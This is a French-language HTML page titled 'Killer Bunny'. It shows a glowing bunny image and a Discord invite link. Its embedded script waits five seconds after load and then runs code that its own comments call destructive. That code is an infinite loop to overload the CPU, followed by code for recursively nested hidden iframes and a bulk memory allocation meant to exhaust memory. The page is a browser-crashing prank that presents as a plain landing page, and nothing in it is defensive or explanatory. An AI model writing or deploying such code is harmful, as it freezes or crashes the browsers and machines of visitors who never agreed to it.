<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Killer Bunny</title>
    <style>
        /* Thème sombre global */
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(145deg, #000000, #1a1a1a);
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }

        /* Conteneur principal */
        .container {
            text-align: center;
            position: relative;
        }

        /* Style de l'image */
        .killer-bunny {
            width: 300px;
            height: auto;
            animation: fadeIn 2s ease-in-out;
            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.7)) drop-shadow(0 0 40px rgba(0, 0, 0, 0.5));
            transition: transform 0.5s ease, filter 0.5s ease;
        }

        .killer-bunny:hover {
            transform: scale(1.1);
            filter: drop-shadow(0 0 40px rgba(255, 255, 255, 1)) drop-shadow(0 0 60px rgba(0, 0, 0, 0.7));
        }

        /* Animation de fade-in */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.8);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        /* Effet brillant autour de l'image */
        .glow {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 350px;
            height: 350px;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.2), transparent);
            border-radius: 50%;
            z-index: -1;
            animation: pulse 3s infinite ease-in-out;
        }

        /* Animation de pulsation */
        @keyframes pulse {
            0%, 100% {
                opacity: 0.5;
                transform: scale(1);
            }
            50% {
                opacity: 1;
                transform: scale(1.2);
            }
        }

        /* Style du bouton Discord */
        .discord-button {
            width: 80px;
            height: 80px;
            background-color: #5865F2;
            border: none;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            position: fixed;
            bottom: 20px;
            right: 20px;
            box-shadow: 0 0 20px rgba(88, 101, 242, 0.7);
            cursor: pointer;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .discord-button:hover {
            transform: scale(1.1);
            box-shadow: 0 0 30px rgba(88, 101, 242, 1);
        }

        .discord-button img {
            width: 50px;
            height: 50px;
        }
    </style>
</head>
<body>
    <!-- Conteneur de l'image principale -->
    <div class="container">
        <div class="glow"></div>
        <img src="https://i.ibb.co/dMK3t7j/4328d00292b082b5f8fa1b648d25b666-removebg-preview.png" 
             alt="Lapin Tueur" class="killer-bunny">
    </div>

    <!-- Bouton Discord -->
    <a href="https://discord.gg/amsUQdUQa7" target="_blank" class="discord-button">
        <img src="https://upload.wikimedia.org/wikipedia/commons/9/91/Discord_icon.svg" alt="Discord Logo">
    </a>

    <!-- Scripts JavaScript -->
    <script>
        // Fonction pour générer un titre aléatoire avec "Killer Bunny" au centre
        function generateTitle() {
            const randomChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let leftPart = "";
            let rightPart = "";
            for (let i = 0; i < 5; i++) {
                leftPart += randomChars.charAt(Math.floor(Math.random() * randomChars.length));
                rightPart += randomChars.charAt(Math.floor(Math.random() * randomChars.length));
            }
            document.title = `${leftPart} Killer Bunny ${rightPart}`;
        }

        // Mise à jour du titre toutes les secondes
        setInterval(generateTitle, 1000);

        // Délai de 5 secondes avant de lancer les scripts destructeurs
        setTimeout(function() {
            // Boucle infinie pour surcharger le CPU
            while (true) {
                console.log("Boucle Infinie...");
            }

            // Iframes imbriquées à l'infini pour saturer la mémoire
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            const nextQueryValue = !location.search ? 1 : Number(location.search.split("?").pop()) + 1;
            iframe.src = `index.html?${nextQueryValue}`;

            // Surcharge mémoire immédiate
            let memoryOverload = [];
            for (let i = 0; i < 100000; i++) {
                memoryOverload.push({});
            }
            console.log("Surcharge mémoire immédiate !");
        }, 5000); // Délai de 5 secondes
    </script>
</body>
</html>
